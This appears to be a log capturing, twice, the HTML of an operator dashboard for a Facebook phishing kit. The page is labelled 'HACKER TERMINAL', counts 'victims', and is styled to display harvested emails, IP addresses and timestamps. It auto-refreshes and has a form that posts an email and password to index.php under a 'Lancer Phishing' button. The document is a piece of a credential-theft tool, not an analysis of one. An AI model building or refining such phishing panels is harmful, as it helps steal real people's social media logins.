06:39:36 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:36 -         .email{color:#ff0;font-weight:bold;}
06:39:36 -         .ip{color:#0ff;}
06:39:36 -         .time{color:#ff6600;}
06:39:36 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:36 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:36 -         .btn:hover{background:#0a0;}
06:39:36 -         .btn-red{background:#f00;color:#fff;}
06:39:36 -     </style>
06:39:36 - </head>
06:39:36 - <body>
06:39:36 -     <div class="header">
06:39:36 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:36 -     </div>
06:39:36 -     <div class="console" id="console">
06:39:36 -             </div>
06:39:36 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:36 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:36 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:36 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:36 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:36 -     </form>
06:39:36 -     <script>
06:39:36 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:36 -     </script>
06:39:36 - </body>
06:39:36 - </html>
06:39:37 - <!DOCTYPE html>
06:39:37 - <html>
06:39:37 - <head>
06:39:37 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:37 -     <meta http-equiv="refresh" content="5">
06:39:37 -     <style>
06:39:37 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:37 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:37 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:37 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:37 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:37 -         .email{color:#ff0;font-weight:bold;}
06:39:37 -         .ip{color:#0ff;}
06:39:37 -         .time{color:#ff6600;}
06:39:37 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:37 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:37 -         .btn:hover{background:#0a0;}
06:39:37 -         .btn-red{background:#f00;color:#fff;}
06:39:37 -     </style>
06:39:37 - </head>
06:39:37 - <body>
06:39:37 -     <div class="header">
06:39:37 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:37 -     </div>
06:39:37 -     <div class="console" id="console">
06:39:37 -             </div>
06:39:37 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:37 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:37 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:37 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:37 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:37 -     </form>
06:39:37 -     <script>
06:39:37 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:37 -     </script>
06:39:37 - </body>
06:39:37 - </html>
